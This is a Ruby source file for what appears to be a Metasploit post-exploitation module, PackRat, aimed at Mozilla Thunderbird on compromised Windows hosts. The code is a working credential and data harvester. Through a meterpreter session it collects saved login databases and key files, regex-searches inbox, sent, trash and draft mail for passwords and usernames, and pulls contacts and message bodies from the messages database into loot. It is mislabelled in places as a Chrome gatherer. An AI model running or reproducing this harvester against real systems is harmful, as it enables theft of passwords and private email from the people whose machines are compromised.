##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  # this associative array defines the artifacts known to PackRat
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Packrat

  ARTIFACTS =
    {
      application: 'thunderbird',
      app_category: 'emails',
      gatherable_artifacts: [
        {
          filetypes: 'logins',
          path: 'AppData',
          dir: 'Thunderbird',
          artifact_file_name: 'signons.sqlite',
          description: "Thunderbird's saved Username and Passwords",
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'logins',
              sql_column: 'username_value, action_url'
            }
          ]
        },
        {
          filetypes: 'logins',
          path: 'AppData',
          dir: 'Thunderbird',
          artifact_file_name: 'key3.db',
          description: "Thunderbird's saved Username and Passwords",
          credential_type: 'binary'
        },
        {
          filetypes: 'logins',
          path: 'AppData',
          dir: 'Thunderbird',
          artifact_file_name: 'cert8.db',
          description: "Thunderbird's saved Username and Passwords",
          credential_type: 'binary'
        },
        {
          filetypes: 'received_emails',
          path: 'AppData',
          dir: 'Thunderbird',
          artifact_file_name: 'Inbox',
          description: "Thunderbird's received emails",
          credential_type: 'text',
          regex_search: [
            {
              extraction_description: 'Searches for credentials (USERNAMES/PASSWORDS)',
              extraction_type: 'credentials',
              regex: [
                '(?i-mx:password.*)',
                '(?i-mx:username.*)'
              ]
            },
            {
              extraction_description: 'searches for Email TO/FROM address',
              extraction_type: 'Email addresses',
              regex: [
                '(?i-mx:to:.*)',
                '(?i-mx:from:.*)'
              ]
            }
          ]
        },
        {
          filetypes: 'sent_emails',
          path: 'AppData',
          dir: 'Thunderbird',
          artifact_file_name: 'Sent',
          description: "Thunderbird's sent emails",
          credential_type: 'text',
          regex_search: [
            {
              extraction_description: 'Searches for credentials (USERNAMES/PASSWORDS)',
              extraction_type: 'credentials',
              regex: [
                '(?i-mx:password.*)',
                '(?i-mx:username.*)'
              ]
            },
            {
              extraction_description: 'searches for Email TO/FROM address',
              extraction_type: 'Email addresses',
              regex: [
                '(?i-mx:to:.*)',
                '(?i-mx:from:.*)'
              ]
            }
          ]
        },
        {
          filetypes: 'deleted_emails',
          path: 'AppData',
          dir: 'Thunderbird',
          artifact_file_name: 'Trash',
          description: "Thunderbird's Deleted emails",
          credential_type: 'text',
          regex_search: [
            {
              extraction_description: 'Searches for credentials (USERNAMES/PASSWORDS)',
              extraction_type: 'credentials',
              regex: [
                '(?i-mx:password.*)',
                '(?i-mx:username.*)'
              ]
            },
            {
              extraction_description: 'searches for Email TO/FROM address',
              extraction_type: 'Email addresses',
              regex: [
                '(?i-mx:to:.*)',
                '(?i-mx:from:.*)'
              ]
            }
          ]
        },
        {
          filetypes: 'draft_emails',
          path: 'AppData',
          dir: 'Thunderbird',
          artifact_file_name: 'Drafts',
          description: "Thunderbird's unsent emails",
          credential_type: 'text',
          regex_search: [
            {
              extraction_description: 'Searches for credentials (USERNAMES/PASSWORDS)',
              extraction_type: 'credentials',
              regex: [
                '(?i-mx:password.*)',
                '(?i-mx:username.*)'
              ]
            },
            {
              extraction_description: 'searches for Email TO/FROM address',
              extraction_type: 'Email addresses',
              regex: [
                '(?i-mx:to:.*)',
                '(?i-mx:from:.*)'
              ]
            }
          ]
        },
        {
          filetypes: 'database',
          path: 'AppData',
          dir: 'Thunderbird',
          artifact_file_name: 'global-messages-db.sqlite',
          description: 'emails info',
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: 'Database Commands which exports Contacts',
              sql_table: 'contacts',
              sql_column: 'name'
            },
            {
              sql_description: 'Conversation Subject',
              sql_table: 'conversations',
              sql_column: 'subject'
            },
            {
              sql_description: 'email address identities',
              sql_table: 'identities',
              sql_column: 'value'
            },
            {
              sql_description: "Email's",
              sql_table: 'messagesText_content',
              sql_column: 'c3author, c4recipients, c1subject, c0body'
            }
          ]
        }
      ]
    }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Chrome credential gatherer',
        'Description' => %q{
          PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems.
          PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries.
          Further details can be found in the module documentation.
          This is a module that searches for thunderbird credentials on a windows remote host.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Kazuyoshi Maruta',
          'Daniel Hallsworth',
          'Barwar Salim M',
          'Z. Cliffe Schreuders', # http://z.cliffe.schreuders.org
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptRegexp.new('REGEX', [false, 'Match a regular expression', '^password']),
        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', true]),
        OptBool.new('EXTRACT_DATA', [false, 'Extract data and stores in a separate file', true]),
        # enumerates the options based on the artifacts that are defined below
        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', ARTIFACTS[:gatherable_artifacts].map { |k| k[:filetypes] }.uniq.unshift('All')])
      ]
    )
  end

  def run
    print_status('Filtering based on these selections:  ')
    print_status("ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}")
    print_status("STORE_LOOT: #{datastore['STORE_LOOT']}")
    print_status("EXTRACT_DATA: #{datastore['EXTRACT_DATA']}\n")

    # used to grab files for each user on the remote host
    grab_user_profiles.each do |userprofile|
      run_packrat(userprofile, ARTIFACTS)
    end

    print_status 'PackRat credential sweep Completed'
  end
end
